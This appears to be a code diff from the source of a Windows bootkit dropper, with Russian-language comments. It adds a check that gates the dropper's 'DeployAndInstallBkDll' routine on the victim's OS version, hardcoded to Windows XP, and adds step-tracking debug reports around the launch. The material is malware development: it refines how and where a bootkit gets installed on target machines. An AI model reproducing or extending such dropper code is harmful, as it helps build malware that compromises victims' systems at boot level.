@@ -171,9 +171,93 @@ bool SaveUrlForBootkitDriver()
 	return true;
 }
 
+enum TargetPlatform
+{
+	TargetPlatform_XP = 1,
+	TargetPlatform_Vista,
+	TargetPlatform_Seven,
+
+	TargetPlatform_All
+};
+
+//TargetPlatform GetTargetPlatform()
+//{
+//	PCHAR TargetName = GetSectionAnsiString("TARGET_PLATFORM");
+//
+//	if ( TargetName )
+//	{
+//		if (m_lstrcmp(TargetName, "target-xp") == 0) return TargetPlatform_XP;
+//		if (m_lstrcmp(TargetName, "target-vista") == 0) return TargetPlatform_Vista;
+//		if (m_lstrcmp(TargetName, "target-seven") == 0) return TargetPlatform_Seven;
+//
+//		STR::Free(TargetName);
+//	}
+//	return TargetPlatform_All;
+//}
+
+TargetPlatform GetTargetPlatform()
+{
+	return TargetPlatform_XP;
+}
+
+bool CurrentPlatformAllowed()
+{
+	TargetPlatform		target = GetTargetPlatform();
+	OSVERSIONINFOEXA	ver;
+
+	// Спецификация указывает на все платформы.
+	// Значит сразу возвращаем ОК.
+	if (target == TargetPlatform_All) return true;
+
+	// Определения платформы.
+	// Ошибка при получении информации считается поводом отклонить запуск.
+	m_memset(&ver, 0, sizeof(ver));
+	ver.dwOSVersionInfoSize = sizeof(ver);
+	if (!pGetVersionExA(&ver) ) return false;
+
+	struct 
+	{
+		TargetPlatform target;
+		DWORD          os_version_major;
+		DWORD          os_version_minor;
+	}	target_table[] = 
+	{
+		{ TargetPlatform_XP   , 5, 1 },
+		{ TargetPlatform_Vista, 6, 0 },
+		{ TargetPlatform_Seven, 6, 1 }
+	};
+
+	for (size_t i = 0; i < ARRAYSIZE(target_table); i++)
+	{
+		if ((target == target_table[i].target) &&
+			(ver.dwMajorVersion == target_table[i].os_version_major) &&
+			(ver.dwMinorVersion == target_table[i].os_version_minor)
+			)
+		{
+			return true;
+		}
+	}
+
+	return false;
+}
+
+
 bool DeployAndInstallBkDll()
 {
 	ULONG ret = -1;
+	
+	// 100_d запуск дропера
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("100_d"));
+
+	// Проверка целевой платформы.
+	if (CurrentPlatformAllowed() == false)
+	{
+		BKIDBG("DeployAndInstallBkDll", "Current platform not allowed by target specifier. Return false.");
+		return false;
+	}
+
+	// 109_d точка прохождения целевой платформы
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("109_d"));
 
 	BKIDBG("DeployAndInstallBkDll", "doing DebugReportStep1 on start.");
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
